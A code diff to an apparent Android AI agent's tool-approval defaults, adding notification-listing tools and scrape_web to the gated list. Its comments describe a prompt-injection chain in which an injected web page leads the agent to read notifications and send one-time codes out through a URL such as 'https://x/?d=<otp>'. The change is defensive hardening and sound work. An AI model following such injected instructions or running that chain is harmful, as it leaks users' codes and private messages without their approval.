@@ -97,7 +97,11 @@ object ToolApprovalDefaults {
         "list_sms_inbox",
         "search_sms",
 
-        // Notification listener side effects (read-only listing is free, mutating is not)
+        // Notification listener. Listing is a privacy read of OTHER apps' data (OTP codes,
+        // chat previews, SMS text — the same content list_sms_inbox is gated for), so it is
+        // gated like the SMS/contacts reads above; mutating actions were already gated.
+        "list_recent_notifications",
+        "list_active_notifications",
         "dismiss_notification",
         "notification_action_click",
         "notification_reply",       // fires a notification's direct-reply RemoteInput action
@@ -226,6 +230,10 @@ object ToolApprovalDefaults {
         // carry anything in context (…/?d=<contacts>) to any server. It was the one ungated
         // egress path: a prompt-injected page could chain it without the user seeing a card.
         "browser_open",
+        // scrape_web GETs a model-chosen URL (directly, or via the search provider), the same
+        // egress footprint as web_fetch. Left ungated it closed a no-approval exfil chain:
+        // injected page -> list_*_notifications -> scrape_web("https://x/?d=<otp>").
+        "scrape_web",
 
         // Phase 25 — Phase 3 second cut. Every mutating tool is approval-gated; the
         // read-only tools (keystore_verify, keystore_list_keys, list_storage_volumes,
